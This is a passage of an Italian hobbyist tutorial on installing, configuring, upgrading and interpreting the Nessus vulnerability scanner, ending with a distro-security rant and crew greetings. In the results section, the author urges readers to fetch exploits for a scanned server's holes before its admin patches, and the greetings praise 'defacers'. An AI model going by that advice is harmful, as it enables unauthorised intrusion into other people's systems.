  rpm -ivh nessus-libraries-1.0.10.rpm
  rpm -ivh libnasl-1.0.10.rpm
  rpm -ivh nessus-core-1.0.10.rpm
  rpm -ivh nessus-plugins-1.0.10.rpm

e il gioco è fatto: il vostro nessus è pronto a runnare ;-) quindi passate
al prossimo paragrafo (però non scordatevi di passare dal via e ritirare le
20.000 prima ;-)

Se avete scaricato i pacchetti tar.gz come vi ho consigliato allora le cose
si complicano e quando il gioco si fa duro i duri cominciano a giocare,
quindi tiratevi su le maniche e preparatevi a sudare tutte e sette le
camicie:
(quello che scrivo sulla riga dove c'è # sono commenti... non scriveteli!)

           #NON loggatevi da utente root per ora!
           #scompattiamo il primo pacchetto...
  tar zxvf nessus-libraries-1.0.10.tar.gz
  cd nessus-libraries
           #creiamo i file di configurazione dei sorgenti...
  ./configure
           #compiliamo i sorgenti...
  make
           #logghiamoci come utente root e installiamo
           #i file che abbiamo appena compilato...
  su
  <inserite la password dell'utente root>
  make install
  su pex3
           #voi ovviamente scrivete il vostro nome account
           #E' decisamente meglio non essere root...
  cd ..
           #proseguiamo nello stesso modo con gli altri pacchetti
  tar zxvf libnasl-1.0.10.tar.gz
  cd libnasl
  ./configure
  make
  su
  <inserite la password dell'utente root>
  make install
  su pex3
  cd ..
  tar zxvf nessus-core-1.0.10.tar.gz
  cd nessus-core
  ./configure
  make
  su
  <inserite la password dell'utente root>
  make install
  su pex3
  cd ..
  nessus-plugins-1.0.10.tar.gz
  cd nessus-plugins
  ./configure
  make
  su
  <inserite la password dell'utente root>
  make install
  su pex3
           #fine! (dell'installazione) ...se non ci ha dato errori
           #altrimenti leggi qui sotto per risolvere il problema...

Nella maggior parte dei casi non dovreste avere avuto dei problemi, ma non
preoccupatevi se ciò è successo, succede quasi a tutti :P e proprio qui
inizia la parte dove (se siete dei duri :-) dovreste iniziare a giocare per
davvero:

- Se usate una delle distribuzioni linux: slackware, red hat e mandrake
  probabilmente avete un problema nelle librerie (questo inconveniente,
  come altri che ho illustrato potrebbero non verificarsi più con le nuove
  versioni di nessus, ma per ora persiste).
  Potete risolverlo con questi semplici comandi:

  cp -l /usr/local/bin/libn* /lib/
  cp -l /usr/local/lib/libhosts_gatherer.* /lib/
  cp -l /usr/local/lib/libpcap-nessus.* /lib/
  cp -l /usr/local/lib/libpeks.* /lib/

  *Questo consiglio per risolvere il problema delle librerie è stato
   fornito da feltonspary <http://spazioweb.inwind.it/felton/>
  *Tra le distribuzioni linux elencate qui sopra io ho provato nessus solo
   su RedHat 7.2 con i pacchetti precompilati rpm scaricati da
   http://www.freshrpms.net/ e devo notare che non ho riscontrato tale
   problema, che potrebbe comunque persistere per i pacchetti tar.gz

- Se usate la distribuzione Linux SuSE le cose si complicano un attimo:
  non potete complilare i pacchetti con yacc e lex (installati di default)
  ma dovete compilarli con bison e flex, inoltre vi mancano delle librerie
  indispensabili (gtk-devel e glib-devel), ma nessun problema, sono inclusi
  nei cd di installazione, quindi procediamo con ordine:
  Per prima cosa avviate YaST2 (il tool di amministrazione del sistema
  incluso in SuSE), inserite la password di root e cliccate su "Software"
  nel menù di sinistra, dopodichè nella parte destra della finestra
  cliccate su "Installare/togliere i pacchetti", quindi su "Cerca" e
  inserite uno alla volta i seguenti nomi ripetendo l'operazione "Cerca":

  bison
  flex
  gtk-devel
  glib-devel

  vi dovrebbe mostrare una riga con scritto il nome del pacchetto, la sua
  dimensione e una breve descrizione: assicuratevi che a sinistra del nome
  del pacchetto ci sia una lettera tra "X", "A" oppure "I" (non "D"!)
  altrimenti fate doppio click sul nome del pacchetto finchè non compare,
  dopo averli selezionati tutti e quattro cliccate su "OK" e inserite i cd
  che vi domanda, riavviate il sistema (per precauzione, ma non è
  raccomandato), ritornate nella directory dove avete salvato i pacchetti
  tar.gz e cancellate le direcotry che avete creato in precedenza
  scompattando i pacchetti con i seguenti comandi:

  su
  <inserite la password dell'utente root>
  rm -r nessus-libraries
  rm -r libnasl
  rm -r nessus-core
  rm -r nessus-plugins
  su pex3
  #voi ovviamente inserite il vostro nome di login

  ed ora ripetete le istruzioni di installazione riportate sopra: non
  dovreste più avere problemi.

- Se ottenete l'errore "undefined reference to yylex" durante
  l'installazione del secondo paccetto necessitate di bison e flex per
  compilare i pacchetti: qui sopra ho spiegato come risolvere il medesimo
  problema con SuSE perchè la conosco bene, ma analogamente dovreste
  procedere per qualsiasi altra distribuzione linux: generalmente questi
  programmi sono presenti nei cd di installazione di ogni distribuzione
  quindi usate le utility che la vostra distribuzione mette a vostra
  disposizione e installate i pacchetti che vi mancano direttamente da lì.

- Se vi esce uno (strano?) errore di librerie (non trova qualcosa che ha a
  che fare con libnasl) questo è dovuto al fatto che le librerie sono messe
  nella directory /usr/local/lib , quindi accertatevi che il file di
  configurazione "/etc/ld.so.conf" contenga una riga con scritto
  "/usr/local/lib", potete farlo con il comando:

  less /etc/ld.so.conf

  (premete "q" per ritornare nel terminale) nel caso che non contenga una
  riga con scritto "/usr/local/lib" editatelo aggiungendo la suddetta riga
  e salvate il tutto.

  Dopo esservi accertati che il file "/etc/ld.so.conf" contenga la riga
  "/usr/local/lib" (o dopo averla aggiunta) proseguite eseguendo il comando
  ldconfig per rendere effettivi i cambiamenti:

  su
  <inserite la password dell'utente root>
  ldconfig

  Ora ripetete l'installazione e non dovreste più incappare in questo
  errore. (per precauzione riavviate il sistema prima di ripetere
  l'installazione)

  Assicuratevi inoltre che "/usr/local/bin" sia nella vostra PATH, potete
  farlo con il comando:

  echo $PATH

  con questo comando vi vengono stampate le vostre path e se non compare
  "/usr/local/bin" eseguite i comandi:

  PATH=$PATH:/usr/local/bin
  export PATH

  il più delle volte risolve il problema... speriamo che lo faccia anche
  nel vostro caso ;-)

- I più frequenti problemi di installazione sono stati affrontati, ma
  talvolta in base alle diverse configurazioni del sistema possono crearsi
  delle situazioni non tipiche, quindi vi consiglio di leggere le F.A.Q.
  (frequently asked questions) del sito ufficiale e nel caso non vi siano
  di aiuto iscrivetevi alla mailing list e ponete il vostro problema,
  sicuramente ci sarà qualcuno in grado di aiutarvi ;-) e magari verrà
  inserito il vostro problema nella nuova release delle F.A.Q. :o)

-------------------------------------------------- Prima Configurazione: --
La parte più difficile è stata superata, ora viene quella più bella :-)
Per prima cosa spiego un po' il principio di funzionamento di nessus:
- Il pacchetto nessus è costituito dal lato server (nessus deamon) e dal
  lato client (nessus client).
- Il server è un programma che permette al client di consultare il database
  dei buchi (plugins) e può essere avviato solo dall'utente root
  richiamandolo con il comando:

  nessusd [parametri aggiuntivi]

  ovviamente se la variabile $PATH (vedi sopra) dell'utente root non
  comprende la cartella "/usr/local/sbin" o vi da un errore tipo:

  bash: nessusd: command not found

  dovete avviarlo scrivendo il percorso completo per raggiungere il server,
  ovvero:

  /usr/local/sbin/nessusd [parametri aggiuntivi]

  I "parametri aggiuntivi" verranno analizzati più avanti in questo
  paragrafo, ora mi limito a spiegare come è composto il pacchetto nessus.
- Il client (eseguibile sia da terminale che sotto X-Windows) è il
  programma che l'utente utilizza per effettuare le scansioni
  interfacciandosi al nessus deamon e sarà quindi avviabile da qualunque
  utente (di default) che abbia un account sul nessus deamon con il
  comando:

  nessus [parametri aggiuntivi]

  questo programma alloggia nella directory "/usr/local/bin" e quindi,
  come detto sopra per il nessusd potete richiamarlo anche con il suo
  percorso completo:

  /usr/local/bin/nessus [parametri aggiuntivi]
- Ovviamente visto che abbiamo un lato server e un lato client indipendenti
  esisterà un "meccanismo" che ci consentirà di loggarci al server dal
  client, questo per poter escludere degli utenti dall'utilizzo di questo
  potente strumento di scansione ed evitare che si trasformi in un'arma a
  doppio taglio.
- Il nessus possiede un database interno con degli "user" e delle "pass
  phrase(s)", ovvero delle password. Ad ognuno di questi account quando
  viene creato vengono associati dei "rules", cioè l'elenco degli host che
  questo user può scansionare, possono essere quindi diniegati dei server o
  permessi solo degli altri, come anche si può settare (come probabilmente
  farete voi :-) di permettere la scansione di ogni server locale e remoto.

L'intento di questo tutorial è di insegnarvi come settare ogni opzione del
nessus, quindi cominciamo dal server:
L'utente root per prima cosa deve settare una password e un username per il
nessus deamon con il comando:

  su
  <inserite la password dell'utente root>
  nessusd -P username,password
  #oppure, come detto sopra: /usr/local/sbin/nessusd [parametri aggiuntivi]

Come sempre il nostro poco prolisso linux non ci darà output con i
complimenti per aver aggiunto correttamente un utente, quindi accertiamoci
di ciò manualmente con il comando:   (eseguito sempre dall'utente root)

  nessusd -L

Ci dovrebbe dare un output come il seguente:

  root - user password

Se così non fosse avremmo certamente sbagliato qualcosa, ma supponendo che
la verifica sia andata a buon fine proseguiamo, con l'aggiunta di un nuovo
utente, sempre eseguendo il comando come utente "root", quindi:

  su
  <inserite la password dell'utente root>
  nessus-adduser

Anche il binario "nessus-adduser" lo trovate nella directory
"/usr/local/sbin", infatti è eseguibile solo da "root".
Ora proseguiamo con l'inserimento dei dati in maniera interattiva, seguite
passo passo:

Dopo aver lanciato il programma "nessus-adduser" verrete accolti con un
messaggio tipo il seguente:

  Using /var/tmp as a temporary file holder

  Add a new nessusd user
  ----------------------


  Login :

Qui ovviamente scriviamo il nome del nessus-user (non necessariamente lo
stesso username che usate per il login al sistema), io per esempio scrivo
"pex3":

  Login : pex3<premete invio>

Dopo aver premuto invio vi esce il seguente messaggio, a cui consiglio di
rispondere "chiper" oppure premete semplicemente invio per continuare,
"chiper" è infatti la scelta di default:

  Authentication method (cipher/plaintext) [cipher] : chiper<premete invio>

Ora se inserite lo stesso nome che un utente del sistema usa per il login
vi chiede se l'utente si connetterà al server dalla macchina locale
(localhost o 127.0.0.1) e ovviamente noi premiamo y per confermare:

  Is "pex3" a local user on this machine [y|n]? y<premete invio>

Se scrivete "y" (y=yes, n=no) otterrete questa conferma:

  Ok, treating user "pex3" as a local user.

Se invece inserite un username che non è usato da nessun utente per fare il
login al sistema vi chiede da che ip (non è valido l'host name) si può
collegare:
(io ho inserito "pex3" in un sistema in cui non esiste nessun user che si
logga con questo username)

  Source restriction
  ------------------

  You can, if you will, configure this account so that it can only
  be used from a given host or subnet. For instance, you may want
  pex3 to be able to connect to this nessusd server only from his
  work machine.

  Please enter the host (or subnet) <user name inserito> is allowed
  to connect from.
  A blank entry will allow him to connect from anywhere

  The entry format must be an IP address followed by an optional netmask.
  Hostnames are *not* accepted

  Examples of valid entries :
     192.168.1.5
     192.168.1.0/24
     192.168.1.0/255.255.255.0

  Invalid entry :
     prof.fr.nessus.org

  Source host or network [anywhere] :<premete invio>

Premete invio per permettere l'accesso all'utente da ogni ip oppure
specificate da quale/quali ip/classe di ip può connettersi.
Ora dobbiamo settare i "rules" (spiegati sopra),la sintassi corretta è la
seguente:

  accept|deny <ip dell'host><premete invio>
  accept|deny <ip dell'host><premete invio>
  .
  .
  .
  default accept|deny<premete invio>
  <premete ctrl+D>

Settiamo la nostra lista e quando abbiamo finito premiamo ctrl-D.
Se per esempio vogliamo permettere scansioni di ogni indirizzo ip (caso più
comune) dovremmo settare i "rules" semplicemente così:

  default accept<premete invio>
  <premete ctrl+D>

Se vogliamo settarlo per permettere al nessus user di scansionare un solo
ip, per esempio 127.0.0.1 dovremo invece settare i "rules" in questo modo:

  accept 127.0.0.1<premete invio>
  default deny<premete invio>
  <premete ctrl+D>

e via dicendo per tutti gli altri casi, quindi:
 "accept" permette la scansione dell'ip specificato,
 "deny" non peremette la scansione dell'ip specificato,
 "default" stabilisce se permettere (default accept) o non permettere
  (default deny) la scansione per tutti gli ip non specificati
  espressamente nella lista.

Ecco l'output che esce per l'aggiunta dei "rules":

  User rules
  ----------
  nessusd has a rules system which allows you to restrict the hosts
  that pex3 has the right to test. For instance, you may want
  him to be able to scan his own host only.

  Please see the nessus-adduser(8) man page for the rules syntax

  Enter the rules for this user, and hit ctrl-D once you are done :
  (the user can have an empty rules set)
  default accept

Dopo aver inserito i "rules" per l'utente (come spiegato sopra) proseguiamo
con la conferma dei dati inseriti:

  Login             : pex3
  Auth. method      : cipher, local user connecting from 127.0.0.1

  Rules             :
  default accept

  Is that ok ? (y/n) [y]

Se i dati del riepilogo non sono corretti siete ancora in tempo per
cancellare questo utente e ritentare ancora, quindi scrivete "n" e premete
"invio" per cancellare il nessus user appena impostato, se avete deciso di
cancellare il nessus user riceverete questo output:

  Aborted

Se invece avete fatto tutto in maniera corretta premete "y" seguito dal
tasto "invio" e inserite la "pass phrase", cioè la password:

  Pass phrase:

Ora riscrivetela un'altra volta per sicurezza:

  Pass phrase:

Se non avete inserito entrambe le due volte la stessa password vi chiede di
riscriverla, mentre se avete scritto la stessa password vi da il messaggio
di conferma:

  + kill -1 696
  user added.

e l'utente è stato aggiunto correttamente! ;-)

Per cambiare i settaggi dei nessus user o per cancellarne/aggiungerne
possiamo anche editare manualmente con un qualsiasi editor di testi il
file:

  /usr/local/etc/nessus/nessusd.users

-------------------------- Lanciamo il programma dall'interccia grafica: --
Ora che abbiamo un nessus user possiamo connetterci al server e iniziare a
scansionare tutti i server che vogliamo (sempre nei limiti della legge del
nostro paese ;-P ) Per prima cosa da utente "root" inizializziamo il
server:

  su
  <inserite la password dell'utente root>
  nessusd -D

Se vi dice che il file/comando è sconosciuto inserite tutta la path:

  /usr/local/sbin/nessusd -D

ed ora da utente "pex3" se avete scelto che il nessus user è un utente
locale lanciate il client:

  su pex3 #se prima eravate "root" ora diventerete "pex3"
  nessus<invio>

anche qui se non trova il comando scrivete:

  /usr/local/bin/nessus

e vi si aprirà la prima volta una finestra con una riga dove vedete dei
numeri che cambiano velocemente, attendete e scrivete nella finestra di
dialogo successiva per due volte la stessa "pass phrase", sta elaborando una
chiave per voi, mentre le volte successive che eseguirete il client uscirà
semplicemente una finestrella che vi chiede di inserire la vostra "pass
phrase", inseritela e vi si aprirà magicamente il tanto sospirato nessus
client. Una volta dentro al client dovremo connetterci al server, inseriamo
il nostro "nessus username" nel campo "login" e premiamo sul tasto "Log in"
che trovate in basso a destra.
Ora selezionate le opzioni dello scan a vostro piacimento: non le spiego
perchè sarebbe quantomeno inutile: infatti vengono costantemente potenziate
e/o aggiornate, quindi seguite il mio consiglio: provatele tutte, prima o
poi le imparerete a conoscere :-)
Se vi dice che è impossibile connettersi al server probabilmente il server
non sta girando, quindi ripetete le operazioni per far partire il server
scritte qui sopra in questo paragrafo. Per assicurarci che il deamon stia
runnando scriviamo:

  ps -A | grep "nessusd"

Se nessusd non esiste significa che non sta girando.

Ecco qui degli errori frequenti e la loro soluzione:

Errori:
- Sppof alert: public key of sender has changed
Siccome la chiave di autenticazione del nessus prevede anche l'ip
dell'utente potete ricevere questo errore se vi state connettendo al nessus
server da un altro indirizzo ip (ad esempio diverso da 127.0.0.1)
- Wrong pass phrase(s) given for key activation - aborting
Probabilmente hai cancellato il file ".nessus.keys" presente nella tua home
directory.
Soluzioni:
- Usate utenti diversi per connettervi da indirizzi ip diversi.
- Per rimuovere le chiavi di autenticazione devi cancellare il file
  "/usr/local/etc/nessusd.keys" o al massimo la vecchia chiave da questo
  file editandolo manualmente.
- Se hai installato il nessus da un pacchetto rpm il file con le chiavi di
  autenticazione lo trovi in questa cartella:
  "/etc/nessus/"
  anzichè quella citata appena sopra.

Errore:
- La finestra dei plugins del client è vuota, o così sembra :-)
Soluzione:
- Connettiti al nessus server prima, poi vedrai che non sarà più vuota ;-)

Problema:
- La scansione alla ricerca dei buchi è molto lenta.
Soluzione:
- Nelle ultime versioni si può settare a piacimento il tempo di attesa per
  le chiamate recv(). Di default nelle ultime versioni questo timeout è
  settato a 15 (dalla 0.99.4 in poi, prima era settato a 5), ma per
  connessioni veloci è buona norma riportarlo a 5, settando il file:

  /usr/local/etc/nessus/nessusd.conf

  alla voce:

  checks_read_timeout = 15

  cambiandola in:

  checks_read_timeout = 5

  Questa modifica alla configurazione di default è stata apportata perchè
  per la maggior parte degli utenti 5 secondi di attesa sono troppo pochi, a
  causa della lentezza (56kbps e adsl) dei collegamenti, pertanto si
  consiglia solo ai collegamenti a velocità (o meglio a larghezza di banda)
  più elevata, altrimenti si rischierebbe di falsare i risultati chiudento
  le request per un timeout troppo basso (per capirci se lo settate a 0
  molto   probabilmente vi dirà che l'host non esiste, ma solo perchè non ha
  risposto entro gli 0 secondi del timeout)

------------------------------------------ Nessus lanciato da terminale: --
Per lanciare il nessus da terminale, senza quindi utilizzare la gui grafica
disponibile sotto X illustrata sopra dovete usare la seguente sintassi:

  nessus --output-type=html --config-file=nessusrc --batch-mode|-q <host>
        <port> <login> <password> <target file> <results file or directory>

Il carattere pipe "|" significa "or", quindi scegliete una delle due o più
opzioni, quando espresso.
Ovviamente dovrete scrivere il comando tutto su una riga e se la cara vecchia
bash è malconfigurata e non trova il comando ricordatevi di inserire tutto
il percorso "/usr/local/bin/" prima del comando, così:

  /usr/local/bin/nessus [parametri aggiuntivi]

Ora analizziamo cosa significano questi parametri e le possibili opzioni:

--output-type=html
              html_graph
              latex
              nsr
              tex
              xml

Questo parametro indica il tipo di output che si vuole ottenere nel report
dei bugs trovati, di default se non mettete questo parametro è selezionato
"nsr", quello che io preferisco è html_graph.

--config-file= file di configurazione del nessus per settare le varie
opzioni, più avanti è spiegato come crearne uno.

--batch-mode|-q mi è stato detto che bisogna esprimerlo, non ho ancora avuto
modo di testare nessus senza questa opzione, cmq per "sentito dire" vi
consiglio di metterlo sempre ;-D

<host> è l'ip del nessus server a cui ci si vuole connettere (o l'hostname).

<port> è la porta in cui è in ascolto il nessus server, la porta storica di
nessusd è 3001, ma è meglio usare la porta 1241, assegnata da IANA.

<password> serve solo con nessus 1.1.x e 1.2.x e non si deve usare con
nessus 1.0.x!

<target file> è il file contenenti gli ip dei server da scansionare (può
contenerne anche più di uno)

<results file or directory> il percorso (meglio se assoluto) e il nome del
file dove salvare l'ouput, cioè i risultati della scansione, il frutto di
tutto questo sbattimento :-) se avete scelto --output-type=html_graph non
dovete impostare il nome del file di output, ma il nome della cartella dove
salvare i file di output composto (solo per questo type) da file html e
immagini png o jpg, francamente non ricordo, ma non è molto rilevante... cmq
dovrebbero essere jpg :-D

queste sono solo le opzioni essenziali e siccome non è molto utile (per voi)
e divertente (per me) tradurre la man page, potete richiamarla con il
comando:

  man nessus

per il manuale nessus(1) del nessus-client, mentre:

  man nessusd

per il manuale nessusd(8) del nessus-server.

Più sopra in questo paragrafo ho accennato al file nessusrc, ora vi spiego
cose è e come crearne uno:
- innanzitutto è il file "centrale" della sessione di scanning, contiene
tutti i settaggi, le opzioni ecc... relativi alle preferenze di scansione
della sessione di scanning che si sta andando ad effettuare.
- crearlo è semplicissimo: attivando il nessus client in modalità grafica
con il comando da terminale:

  /usr/local/bin/nessus

ora si disabiliti tutte le opzioni, eccetto quelle che si intende attuare;
si salvi il file e lo si setti successivamente per le prossime scansioni
editandolo con qualunque editor di testo:
Selezionate le opzioni dello scan a vostro piacimento, non le spiego qui
perchè sarebbe quantomeno inutile: infatti vengono costantemente potenziate
e/o aggiornate, quindi seguite il mio consiglio: provatele tutte, prima o
poi le imparerete a conoscere :-)

------------------------------------------------------ Upgrading Nessus: --
Ovviamente, siccome è uno strumento che viene aggiornato con rapidità, in
quanto legato alla internet-security, è spesso doveroso fare un upgrade,
giusto per non rendere inutile la scansione, che non sarebbe in grado di
trovare bug e/o vulnerabilità varie rese note solo dopo dell'uscita della
release di nessus di cui si dispone.
Per upgradare semplicemente l''archivio plugins lanciate il comando:

  su
  <inserite la password di root>
  nessus-plugin-update

ovviamente tenete conto che il suddetto file si trova in /usr/local/sbin
quindi eseguibile solo da root...
Per aggiornarlo è cmq molto facile: io vi consiglio di disinstallarlo e
reinstallare una nuova versione, molti consigliano di upgradare solo il
pacchetto dei plugins, errando essenzialmente per i seguenti motivi:
- tra una release e l'altra non cambiano solo il numero di plugins, cioè i
  tests delle vulnerabilità, ma tutto il sistema nessus viene reso più
  efficiente, veloce e stabile, (usate quindi nessus-plugin-update solo
  per aggiornarlo tra una versione e l'altra...)
- i nuovi plugins potrebbero essere incompatibili con il resto del sistema
  nessus o più semplicemente alcuni di essi non potrebbero essere
  supportati a causa dell'introduzione di nuove features,
- si rischia di rendere nessus più instabile e sarebbe davvero rognoso
  dover ricominciare una scansione approfondita, magari della durata
  addirittura di più ore, per un blocco del nessus,
- se viene rilasciato un nuovo nessus tutto al completo ci sarà un motivo
  valido, non vi pare? :-)
Quindi eseguiamo da root i seguenti comandi:
(Supponendo che "/home/pex3/nessus/" sia la directory che contiene le
directory "nessus-libraries", "libnals", "nessus-core" e "nessus-plugins".
Se non vi ricordate cosa erano rileggete la parte dell'installazione...
dopo il carattere cancelletto "#" ci sono dei commenti: leggeteli ma non
scriveteli! :-)

  su
  <inserite la password dell'utente root>
  #killiamo tutti i processi del server "nessusd" e del client "nessus"
  killall nessusd
  killall nessus
  #voi ovviamente inserite la vostra directory...
  cd /home/pex3/nessus/
  cd nessus-libraries
  uninstall-nessus
  make distclean
  cd ../libnals
  make distclean
  cd ../nessus-core
  make distclean
  cd ../nessus-plugins
  make distclean
  cd ..
  #ora ci troviamo in /home/pex3/nessus <<- scrivete "pwd" per verifica!
  #ed abbiamo finito la fase di disinstallazione.
  #il seguente comando è pericoloso: eliminerà tutto ciò che si trova in
  #questa directory: cioè tutto il contenuto di "/home/pex3/nessus/*"
  #NB. ->> è irreversibile <<- cioè i dati non saranno più recuperabili
  #quindi usate cautela!!!
  rm -r *
  #ora è tempo di reinstallazione:
  #Now it's time to rock and roll. ;-)

Per installare nuovamente il nessus potete rileggervi la parte iniziale del
mio tutorial: vedrete che rifare l'installazione per la seconda volta vi
sembrerà più semplice e sarete più sciolti ;-) ovviamente fate ciò solo se
disponete di una nuova versione di nessus! ;-D

--------------------------------- Come interpretare i risulatati: --
A questo punto l'unica cosa che manca nel tutorial è come interpretare gli
input, e magari consigli su come sfruttare le eventuali falle e info
trovate:
- se la scansione ha trovato degli "holes" significa che ha trovato dei
buchi, allora vi spiegherà (in inglese :-( ) di cosa si tratta e dove
trovare l'exploit: in particolare il "bugtraq id" indica il codice di
identificazione di quel bug all'interno dell'archivio di bugtraq,
disponibile gratuitamente sul sito ufficiale di bugtraq:

   http://www.securityfocus.com/

- se da dei "warning" (avvertimenti) significa che il particolare è
abbastanza rilevante, ma non comporta necessariamente un bug,
- se da delle "info" non è nulla di speciale: versione del software
installato, fingerprinting e cose del genere: comunque utile, perchè se
sentite parlare o leggete di un bug a un determinato demone (sshd, ircd,
wu_ftpd, httpd ecc...) sapete che quel tal server aveva quel tal demone e
quindi, se tanto vi da tanto.... accorrete a procurarvi l'exploit prima che
l'admin accorra a prendere una patch! ;-P

In particolare io ho trovato sulla mia adoratissima Linux SuSE 7.2 Box
installazione all-default un bug (in data febbraio 2002) alla secure shell
(sshd), svariati warning e delle info in riguardo all'sshd, vari demoni
a mio avviso "secondari" e al kernel in uso.
Ovviamente ho chiuso la secure shell (anche se non continuo a non capire
che cazzo la attivano a fare di default per la configurazione
workstation/office se ad un utente domestico non serve a un demerito cazzo
di niente :-) ed altre cazzatucce varie che davano dei warning.

Per quanto riguarda le info che nessus vi mette nel report scansione vi dò
un suggerimento forse un po' paranoico: se il server target della scansione
(bersaglio) è serio, non fidatevi delle info del nessus (e nemmeno di
quelle di nmap, in particolare dello stack fingerprinting), infatti è
possibile (molto possible direi...) che abbiano installato particolari tool
che permettono di modificare gli stack di risposta di alcuni pacchetti in
modo da simulare la presenza di un altro sistema operativo/demone che in
realtà non è quello che sta girando, o che venga spoofata la versione del
software in uso dal server. Molto spesso capita anche che venga simulata la
presenza di un servizio (per es. netbios su *nix) che di solito non è
presente su quel sistema operativo, quindi nessus in questi casi sparerà
cazzate a casaccio o, più semplicemente, vi dirà che non riesce ad eseguire
un footprinting/fingerprinting del server target.

----------------------------------------------------------- Conclusioni: --
Beh che dire: è finita! ;-) spero vi sia piaciuto e che continuate a
leggere i miei tutorial... devo dire che mi è molto piaciuto scrivere questo
tutorial (non solo per la musica GgDag rules di sottofondo :-) e quindi
presto ne scriverò un altro, ma ora devo pensare di cosa parlare nel
prossimo! ;-)

------------------------------------------------------------Links Utili: --
I migliori siti dove reperire informazioni su vulnerabilità, bugs, exploit,
advisories, patch e quant'altro relativamente alle falle informatiche:

http://www.pex3.com/exploit/                        -=]About Hacking & Co.
http://www.debian.org/security/                     Debian Advisories
http://www.redhat.com/corp/support/errata/          RedHat Advisories
http://www.suse.de/security/                        SuSE Advisories
http://www.calderasystems.com/news/security/        Caldera Advisories
http://www.microsoft.com/                           Windows Site
http://sunsolve.sun.com/pub-cgi/show.pl             Solaris News/Advisories
http://www.securityfocus.com/                       Mailing List "BugTraq"
http://www.securityportal.com                       Security Portal
http://www.packetstormsecurity.com/                 PacketStorm
http://www.cert.org/                                CERT Advisories
http://www.hackingexposed.com/                      Hacking Exposed's Site
http://bugs.php.net/                                PHP Scripts Bugs
http://www.bismark.it/                              Bismark

--------------------------------------------------------- Area Polemica: --
Tempo fa mi sono scornato su un forum parlando di hacking e distribuzioni
linux (kuht.it forse? :-) dicendo (a mio avviso "giustamente") che RedHat è
un gruviera (non proprio con questi termini :-), ora dimostro ciò che
sostenevo:
- mese di gennaio 2002 dopo aver cancellato la mia amatissima SlackWare
  installo RedHat (per la seconda volta nella mia vita, la prima era la
  vecchia 6.2) per vedere se Kain aveva un pochino ragione a difendere la
  sua amata (?) RedHat 7.2
- solita installazione di default workstation/office, ma questa volta,
  come già detto, di RedHat 7.2 (uscita addirittuta DOPO di SuSE 7.2),
- pochi minuti dopo l'installazione all-default ecco i risultati di Nessus:

7 buchi (!!!) e svariati (9) warning, nonchè fingerprinting esatto,
versioni di tutti i demoni e vari servizi in ascolto esatti (come del resto
era normale aspettarsi, visto che non avevo camuffato gli stack).

Mi piacerebbe sapere come si comportano le altre distribuzioni con una
installazione all-default, per ora ho scansionato solo due di esse in
configurazione default: Slackware e SuSE. Per quanto riguarda Slackware non
posso obiettare nulla: si è comportata banissimo, mentre SuSE ha rivelato 1
solo buco: niente male considerando il numero (inutile) di server
installati automaticamente con questa configurazione e di cui solo ssh
presentava vulnerabilità degne di nota.

Concludo dal mio test: Premettendo che la ho confrontata con SuSE (mica
debian o openbsd, che allora ammetterei un pochino il divario) non vi
sembra un po' ******* sostenere che RedHat sia tale da non potersi definire
un "gruviera"?
(testuali parole. gruviera: qualità di formaggio pieno di buchi :-)
oppure sarà stato il caldo di gennaio (!?) a far sì che RedHat abbia
fatto dei piccoli buchini nei suoi demoni per prendere un po' di aria?
A parte questo devo counque osservare che sicuramente un admin non
connetterà mai (spero...) una RedHat all-default così come non
consiglierei di fare nemmeno per una OpenBSD all-default senza prima
disattivare i servizi inutili, cambiare le password di default (warning)
agli utenti di sistema ed altre premure basilari del genere.

Da ciò osservo e imparo che:
Il tempo che si risparmia nell'installazione del sistema, nella
installazione dei rpm piutosto che i tar.gz, nella configurazione gui-like
che caratterizza RedHat (ed altre distro...) vada tutto perso nel tempo per
patchare, toppare, killare servizi inutili, instabili e bucati avendo per
di più lo svantaggio di trovarsi a gestire un sistema che fa acqua da ogni
parte?

Forse vi chiedete perchè non rispondo nel suddetto forum e invece srivo la
risposta in questo tutorial... intanto il forum è chiuso, così come il sito
che verrà trasferito al url:

  http://www.esoh.it/

e poi per un altro buon motivo:
perchè questo tutorial è ad hoc per questo tipo di confronti, in modo da
dare un'idea generale del livello di sicurezza di linux nelle sue varie
distribuzioni anche a chi non abbia partecipato alla suddetta discussione.
Colgo l'occasione per salutare tutti i membri delle crew fuse sotto il
nome di esoh ;-)

            pex3 - noflyzone underground crew member

---------------------------------------------------------- Fuck & Greet: --
pex3 fucks:
- tutti i lameri (anche se alcuni sono davvero buffi nei loro atteggiamenti,
- la gdf (guardia di finanza) che ha il brutto vizio di chiudere siti.. :-(
- quelli che si sono iscritti alla mia newsletter solo per accedere alla
sezione porno del sito (e sono parecchiotti: almeno 20 al giorno :o),
- rutelli (uno piu' imbecille non lo avevate? :-/,
- ovviamente a quelli che mi querano quando sono pex3-away (anche se mi
  vedete parlare in chan sono impegnato, altrimenti mi chiamerei
  semplicemente pex3 ;-),
- Valnir... te lo avevo promesso, no? :-)
- gli insistenti, ricordate: domandare e' legittimo,
  rispondere e' cortesia.   E spesso qualcuno non risponde perche':
  a)non ne ha volgia ;-)
  b)non sa la risposta :-)
  c)ha di meglio da fare. :-D
  Quasi mai non si risponde perche' si e' ciechi e/o stupidi e/o sordi,
  quindi evitare dei "domande-flood" (?) in chan e/o in query è la prima
  regolare per non ritrovarsi +b (+b è un chan mode non molto bello :-)

pex3 greetings:
- noflyzone crew members, ovvero:
  []LoRd[V]icio[], (founder e un po' scassacazzo) <<- scherzo! :-D
  Crashes,
  [D]kl,
  CityHunter, (il migliore impaginatore della e-zine: l'unico :-)
  goony, (openbsd & debian rules... e non contraddicetelo! :-)
  Quasar,
  [Evil],
  R|Ppy,
  BIGAlex,      (non ditegli che è messo malex altrimenti si arrabia: è solo
  Capitanmidnight,                 uno spiacevole caso di ononimia hihihi..)
  Pregzt,
  [V]lad, (defacciatore a raffica :-P )
  anetrip,
  Ov3rSyS, (allievo-defacciatore :o)
  sevvv, (uno degli ultimi acquisti, speriamo bene... ;-)
  io ovviamente, :-D
- tanaton, (e tutto #hackarena ovviamente :-)
- zerocky, (U*BS rules)
- DaveWork, (php master con molta pazienza :-)
- ava666, (the best one)
- lo0ker, (vecchio nemico... hihihi ma è un grande ;-)
- Cujo, (all'inizio mi bannava, ora si è abituato a me :-)
- SuperAlbert,
- bitflesh, (amico di vecchia data)
- cavallocaruso,
- ErMaK, (no comment: e non aggiungo altro :-)
- CobWebX,
- Lottan, (che si è iscritto alla newsletter per accedere all'area xxx :-)
- RESINARO, (un vecchio amico... un po' che non ti fai vedere eh?)
- GREEN_BERET, (unix-likes man: uno dei pochi veri vecchi compagni di crew)
